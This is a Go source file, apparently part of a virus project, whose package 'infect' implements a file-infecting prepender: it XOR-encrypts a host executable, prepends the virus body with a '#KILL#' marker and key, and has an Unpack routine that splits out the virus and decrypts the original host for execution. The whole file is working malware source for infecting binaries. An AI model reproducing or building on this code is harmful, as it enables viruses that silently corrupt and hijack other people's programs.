package infect

import (
	"bytes"
	"io/ioutil"
)

const (
	InfectMark = "#KILL#"
)

// Infect will take the binary at `path`, infect `path` with `virus` and return
// a key
func Infect(path string, virus []byte) []byte {
	binary, err := ioutil.ReadFile(path)
	if err != nil {
		panic(err)
	}

	key := generateKey()

	encBinary := xor(binary, key)

	newBinary := virus[:]
	newBinary = append(newBinary, []byte(InfectMark)...)
	newBinary = append(newBinary, key...)
	newBinary = append(newBinary, encBinary...)

	return newBinary
}

// Unpack will find the key and host of the file to decrypt it and execute
func Unpack(path string) (virus, host []byte) {
	binary, err := ioutil.ReadFile(path)
	if err != nil {
		panic(err)
	}

	infectIndex := bytes.Index(binary, []byte(InfectMark))

	// If there is no mark, then the current binary IS the virus.
	// This is the initial spread
	if infectIndex == -1 {
		return binary, nil
	}

	virus = binary[:infectIndex]

	keyBeginI := infectIndex + len(InfectMark)
	keyEndI := keyBeginI + 32
	key := binary[keyBeginI:keyEndI]

	host = xor(binary[keyEndI:], key)

	return
}
